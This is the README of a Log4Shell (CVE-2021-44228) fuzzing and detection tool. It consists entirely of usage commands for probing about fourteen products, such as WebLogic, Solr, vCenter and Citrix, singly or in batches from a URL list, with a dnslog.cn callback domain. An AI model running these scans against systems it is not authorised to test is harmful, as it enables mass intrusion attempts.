# Log4j2-Fuzz

     __                __ __  _ ___        ______             
    / /   ____  ____ _/ // / (_)__ \      / ____/_  __________
   / /   / __ \/ __ '/ // /_/ /__/ /_____/ /_  / / / /_  /_  /
  / /___/ /_/ / /_/ /__  __/ // __/_____/ __/ / /_/ / / /_/ /_
 /_____/\____/\__, /  /_/_/ //____/    /_/    \__,_/ /___/___/
             /____/    /___/      CVE-2021-44228#Dghpi9 v2.1                   

Header Fuzz
	URL  ./Log4j2-Fuzz -u http://192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -f url.txt -d dnslog.cn

POC检测
	致远OA(A8,A6,G6..)
	URL ./Log4j2-Fuzz -see http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -sees url.txt -d dnslog.cn
	
	MobileIron
	URL  ./Log4j2-Fuzz -mob http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -mobs url.txt -d dnslog.cn

	WebLogic
	URL ./Log4j2-Fuzz -weblogic http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -weblogics url.txt -d dnslog.cn
	
	Apache Solr
	URL ./Log4j2-Fuzz -solr http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -solrs url.txt -d dnslog.cn
	
	Apache Druid
	URL ./Log4j2-Fuzz -druid http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -druids url.txt -d dnslog.cn
	
	Apache OFBiz
	URL ./Log4j2-Fuzz -ofbiz http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -ofbizs url.txt -d dnslog.cn

	Apache Struts 2 
	URL ./Log4j2-Fuzz -st2 http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -st2s url.txt -d dnslog.cn
	
	Vmware Horizontest
	URL ./Log4j2-Fuzz -vh
	批量 ./Log4j2-Fuzz -vhs

	VMWare VCenter
	URL ./Log4j2-Fuzz -vc http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -vcs url.txt -d dnslog.cn

	Apache JSPWiki
	URL ./Log4j2-Fuzz -jspwiki http//192.168.0.1 -d dnslog.cn
	批量 目标太少，暂不支持
	
	Citrix XenMobile
	URL ./Log4j2-Fuzz -cit http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -cits url.txt -d dnslog.cn
	
	Unifi Network Appliance
	URL ./Log4j2-Fuzz -una http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -unas url.txt -d dnslog.cn
	
	VMWare Workspace One
	URL ./Log4j2-Fuzz -vwo http//192.168.0.1 -d dnslog.cn
	批量 ./Log4j2-Fuzz -vwos url.txt -d dnslog.cn
